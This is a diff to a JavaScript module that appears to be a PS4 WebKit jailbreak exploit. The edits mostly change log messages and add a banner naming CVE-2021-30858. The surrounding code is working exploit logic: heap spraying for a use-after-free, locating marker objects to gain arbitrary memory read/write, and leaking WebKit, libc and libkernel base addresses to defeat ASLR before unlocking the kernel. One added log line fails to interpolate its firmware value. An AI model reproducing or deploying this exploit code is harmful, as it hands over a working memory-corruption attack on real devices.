@@ -1,3 +1,4 @@
+// src/ps4/userland.mjs
 import { version, logger } from "../utils.mjs";
 import { Offsets } from "./offsets.mjs";
 
@@ -621,7 +622,7 @@ function sleep(nsec) {
 }
 
 async function init_arw() {
-  logger.info("Initiate UAF...");
+  logger.info("Initialize UAF...");
 
   const abs = new Array(spray_count);
 
@@ -810,13 +811,13 @@ async function init_arw() {
     for (let i = 0; i < dv.byteLength / 8; i += 8) {
       if (!found && dv.getBigUint64(i, true) === marker) {
         const marker = start + BigInt(i * 8);
-        logger.info(`Found Array marker at ${marker.hex()} !!`);
+        logger.info(`Found Array marker at ${marker.hex()} !!!`);
         const oob_arr_addr = rw.read8(marker + 0x20n);
         logger.debug(`oob_arr_addr: ${oob_arr_addr.hex()}`);
         const oob_arr_butterfly = rw.read8(oob_arr_addr + 8n);
         logger.debug(`oob_arr_butterfly: ${oob_arr_butterfly.hex()}`);
         oob_arr_indexing_header_addr = oob_arr_butterfly - 8n;
-        logger.debug(`oob_arr_indexing_header_addr: ${oob_arr_indexing_header_addr.hex()}`);
+        logger.debug(`oob_arr_indexing_header: ${oob_arr_indexing_header_addr.hex()}`);
         const oob_arr_indexing_header = rw.read8(oob_arr_indexing_header_addr);
         if (oob_arr_indexing_header.lo() !== 2n || oob_arr_indexing_header.htol() !== 3n) {
           continue;
@@ -826,7 +827,7 @@ async function init_arw() {
 
       if (!found_ffs && dv.getBigUint64(i, true) === marker_ffs) {
         const marker = start + BigInt(i * 8);
-        logger.info(`Found FontFace marker at ${marker.hex()} !!`);
+        logger.info(`Found FontFace marker at ${marker.hex()} !!!`);
         const js_font_addr = rw.read8(marker + 0x20n);
         logger.debug(`js_font_addr: ${js_font_addr.hex()}`);
         const font_addr = rw.read8(js_font_addr + 0x18n);
@@ -935,7 +936,7 @@ async function init_arw() {
   delete container.vector;
   delete container.length_and_flags;
 
-  logger.info("Achieved ARW !!");
+  logger.info("Achieved ARW !!!");
 }
 
 function init_aslr() {
@@ -952,12 +953,12 @@ function init_aslr() {
     logger.debug(`m_function: ${m_function.hex()}`);
 
     webkit_base = m_function - Offsets.current.wk_expm1_builtin;
-    logger.info(`webkit base: ${webkit_base.hex()}`);
+    logger.info(`webkit_base: ${webkit_base.hex()}`);
 
     try {
       strerror_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp_strerror, true);
       libc_base = strerror_addr - Offsets.current.c_strerror;
-      logger.info(`libc base: ${libc_base.hex()}`);
+      logger.info(`libc_base: ${libc_base.hex()}`);
     } catch (e) {
       logger.warn("Could not read libc base, using fallback");
       libc_base = webkit_base - 0x10000000n;
@@ -966,7 +967,7 @@ function init_aslr() {
     try {
       _error_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp___error, true);
       libkernel_base = _error_addr - Offsets.current.k__error;
-      logger.info(`libkernel base: ${libkernel_base.hex()}`);
+      logger.info(`libkernel_base: ${libkernel_base.hex()}`);
     } catch (e) {
       logger.warn("Could not read libkernel base, using fallback");
       libkernel_base = webkit_base - 0x20000000n;
@@ -1116,6 +1117,20 @@ function run_goldhen_direct() {
   }
 }
 
+function show_webkit_info() {
+  logger.info("=========================================");
+  logger.info("  WEBKIT PS4 EXPLOIT");
+  logger.info(`  Firmware: ${version.toString()}`);
+  logger.info("  Status: SUCCESS");
+  logger.info("  WebKit Exploit: CVE-2021-30858");
+  logger.info("  Type: Use-After-Free (UAF)");
+  logger.info("=========================================");
+  logger.info("  Supported Versions:");
+  logger.info("  8.00, 8.01, 8.03, 8.50, 8.52");
+  logger.info("  9.00, 9.03, 9.04, 9.50, 9.51, 9.60");
+  logger.info("=========================================");
+}
+
 function init_structs() {
   timespec = new Struct("timespec", [
     { type: "Int64", name: "tv_sec" },
@@ -1133,6 +1148,7 @@ export async function main() {
     logger.info(`  Target: PS4 ${version.toString()}`);
     logger.info("-----------------------------------------");
 
+    show_webkit_info();
     init_structs();
     await init_arw();
     init_aslr();
@@ -1152,6 +1168,8 @@ export async function main() {
       logger.info("  Debug Settings: ENABLED");
       logger.info("  Kernel: UNLOCKED");
       logger.info("=========================================");
+      logger.info("  P54 | firmware: ${version.toString()}");
+      logger.info("  WebKit Exploit: SUCCESS");
     }
 
     logger.info("===END===");
